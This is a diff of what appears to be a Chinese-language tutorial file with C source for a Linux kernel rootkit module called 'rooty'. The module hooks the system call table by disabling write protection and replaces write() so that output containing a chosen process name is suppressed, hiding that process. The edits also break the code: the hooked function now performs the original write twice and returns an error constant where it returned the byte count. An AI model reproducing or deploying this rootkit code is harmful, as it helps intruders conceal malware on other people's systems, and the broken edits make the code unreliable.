@@ -453,17 +453,12 @@ void enable_write_protection(void)
 
 ```c
 #include <linux/module.h>
+#include <linux/init.h>
 #include <linux/kernel.h>
-#include <asm/unistd.h>
-#include <linux/types.h>
-#include <linux/sched.h>
-#include <linux/dirent.h>
-#include <linux/string.h>
-#include <linux/file.h>
-#include <linux/fs.h>
-#include <linux/list.h>
-#include <asm/uaccess.h>
+#include <linux/kobject.h>
 #include <linux/unistd.h>
+#include <linux/syscalls.h>
+#include <linux/string.h>
 #include <linux/slab.h>
 
 
@@ -478,10 +473,7 @@ struct linux_dirent{
 	char    d_name[1];
 };
 
-void * get_lstar_sct_addr(void);
-unsigned long ** get_lstar_sct(void);
-void disable_write_protection(void);
-void enable_write_protection(void);
+
 
 asmlinkage long (*orig_write)(unsigned int fd,
 		char *buf, unsigned int count);
@@ -540,6 +532,7 @@ void enable_write_protection(void)
 asmlinkage long hacked_write(unsigned int fd,
 		char * buf, unsigned int count)
 {
+    int r;
     char *k_buf;
 	k_buf = (char*)kmalloc(256,GFP_KERNEL);
 	memset(k_buf,0,256);
@@ -547,11 +540,13 @@ asmlinkage long hacked_write(unsigned int fd,
     if(strstr(k_buf,processname))
 	{
 		kfree(k_buf);
-		return count;
+		return EEXIST;
 	}
+    r = (*orig_write)(fd,buf,count);
     kfree(k_buf);
     return orig_write(fd,buf,count);
 }
+
 static int rooty_init(void)
 {   
     sys_call_table = get_lstar_sct();
@@ -574,12 +569,4 @@ static void rooty_exit(void)
 MODULE_LICENSE("GPL");
 module_init(rooty_init);
 module_exit(rooty_exit);
-
 ```
-
-下面是一个hook_ps的例子
-
-```c
-
-```
-
